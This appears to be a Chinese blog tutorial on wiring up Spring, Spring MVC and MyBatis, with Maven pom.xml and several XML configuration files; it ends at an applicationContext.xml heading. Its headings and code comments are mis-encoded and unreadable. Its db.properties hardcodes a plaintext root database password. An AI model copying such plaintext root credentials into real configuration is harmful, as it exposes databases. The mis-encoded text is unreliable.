      <h1 id="SSMæ¡†æ¶æ•´åˆ"><a href="#SSMæ¡†æ¶æ•´åˆ" class="headerlink" title="SSMæ¡†æ¶æ•´åˆ"></a>SSMæ¡†æ¶æ•´åˆ</h1><h2 id="å¯¼å…¥ç›¸å…³çš„ä¾èµ–"><a href="#å¯¼å…¥ç›¸å…³çš„ä¾èµ–" class="headerlink" title="å¯¼å…¥ç›¸å…³çš„ä¾èµ–"></a>å¯¼å…¥ç›¸å…³çš„ä¾èµ–</h2><ul>
<li><p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ssmBuild<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        mybatis--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        æ•°æ®åº“é©±åŠ¨--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.49<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        æ•°æ®åº“è¿æ¥æ± --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        spring--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        junit--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resource<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="æ•´åˆmybatis"><a href="#æ•´åˆmybatis" class="headerlink" title="æ•´åˆmybatis"></a>æ•´åˆmybatis</h2><ul>
<li><p>db.properties</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jdbc.driver=com.mysql.jdbc.Driver</span><br><span class="line">jdbc.username=root</span><br><span class="line">jdbc.password=asdqwe123.</span><br><span class="line">jdbc.url=jdbc:mysql://localhost:3306/ssmbuild?useUnicode=true&amp;characterEncoding=utf8</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>Mybatis-config.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE configuration</span></span><br><span class="line"><span class="meta">        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"</span></span><br><span class="line"><span class="meta">        "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--é…ç½®æ•°æ®æºï¼Œspringä»£ç†äº†--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    é…ç½®åˆ«å--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"com.huzai.pojo"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    mapperæ‰«æ--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"com.huzai.dao"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>Spring-dao.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--   å…³è”æ•°æ®åº“é…ç½®æ–‡ä»¶--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">"classpath:db.properties"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    è¿æ¥æ± --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSource"</span> <span class="attr">class</span>=<span class="string">"com.mchange.v2.c3p0.ComboPooledDataSource"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClass"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.driver&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.username&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.password&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"jdbcUrl"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.url&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxPoolSize"</span> <span class="attr">value</span>=<span class="string">"30"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"minPoolSize"</span> <span class="attr">value</span>=<span class="string">"10"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"checkoutTimeout"</span> <span class="attr">value</span>=<span class="string">"10000"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"autoCommitOnClose"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"acquireRetryAttempts"</span> <span class="attr">value</span>=<span class="string">"2"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    sqlSessionFactory--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sqlSessionFactory"</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.SqlSessionFactoryBean"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        ç»‘å®šmybatisé…ç½®æ–‡ä»¶--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"configLocation"</span> <span class="attr">value</span>=<span class="string">"classpath:mybatis-config.xml"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    é…ç½®daoæ¥å£æ‰«æåŒ…ï¼ŒåŠ¨æ€å®ç°daoæ¥å£æ³¨å…¥springå®¹å™¨ä¸­--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"mapperScannerConfigurer"</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.mapper.MapperScannerConfigurer"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        æ³¨å…¥sqlSessionFactory--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"sqlSessionFactoryBeanName"</span> <span class="attr">value</span>=<span class="string">"sqlSessionFactory"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        éœ€è¦æ‰«æçš„daoåŒ…--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"basePackage"</span> <span class="attr">value</span>=<span class="string">"com.huzai.dao"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="æ•´åˆspring"><a href="#æ•´åˆspring" class="headerlink" title="æ•´åˆspring"></a>æ•´åˆspring</h2><ul>
<li><p>spring-service.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    è¦æ‰«æçš„serviceä¸‹çš„åŒ…--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.huzai.service"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    å°†æ‰€æœ‰çš„ä¸šåŠ¡ç±»ï¼Œæ³¨å…¥åˆ°springå®¹å™¨ä¸­ï¼Œå¯ä»¥é…ç½®å®ç°ï¼Œä¹Ÿå¯ä»¥æ³¨è§£å®ç°--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;bean id="bookServiceImpl" class="com.huzai.service.bookServiceImpl"&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;property name="bookMapper" ref="bookMapper"/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/bean&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    å£°æ˜äº‹ç‰©é…ç½®--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSourceTransactionManager"</span> <span class="attr">class</span>=<span class="string">"org.springframework.jdbc.datasource.DataSourceTransactionManager"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        æ³¨å…¥æ•°æ®æº--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    aopäº‹ç‰©æ”¯æŒ--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="æ•´åˆspring-mvc"><a href="#æ•´åˆspring-mvc" class="headerlink" title="æ•´åˆspring-mvc"></a>æ•´åˆspring-mvc</h2><ul>
<li><p>spring-mvc.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">"http://www.springframework.org/schema/mvc"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    æ³¨è§£é©±åŠ¨--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    é™æ€èµ„æºè¿‡æ»¤--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    æ‰«æåŒ…--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.huzai.controller"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    è¯•å›¾è§£æå™¨--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"internalResourceViewResolver"</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/jsp/"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>applicationContext.xml</p>
